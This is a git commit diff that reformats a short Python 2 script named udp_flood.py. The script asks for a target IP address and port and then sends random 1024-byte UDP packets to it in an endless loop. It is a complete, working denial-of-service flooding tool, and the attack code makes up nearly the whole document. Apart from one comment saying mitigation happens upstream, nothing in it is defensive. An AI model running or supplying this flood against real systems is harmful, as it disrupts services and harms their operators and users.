ad66e19d840ab290900e9cbbf977f6d906928589
Caleb-Shepard <cshepard6055@floridapoly.edu>
2017-09-28 16:59:37 -0400

    Update udp_flood.py

--- udp_flood.py
+++ udp_flood.py
@@ -1,17 +1,17 @@
 # mitigation for these attacks are usually upstream from your server
 
 import socket 
-import random # The script will random packet sizes
+import random
 
 #Read user input
-ip=raw_input('Target IP: ') # The IP address to be atacked
-port=input('Port number: ') # Port we direct to attack
+ip = raw_input('Target IP: ') # The IP address to be atacked
+port = input('Port number: ') # Port we direct to attack
 
-sent=1
-bytes=random._urandom(1024) # determine size before loop
-sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
+sent = 1
+bytes = random._urandom(1024) # determine size before loop
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #Creates a socket
 
 while True: # Infinite loop
-    sock.sendto(bytes,(ip,port)) # send packet
-    print "Sent %s packets to %s at port %s." % (sent,ip,port) # comment this line if you don't want to print
-    sent=sent + 1
+    sock.sendto(bytes, (ip, port)) # send packet
+    print "Sent %s packets to %s at port %s." % (sent, ip, port)    
+    sent += 1
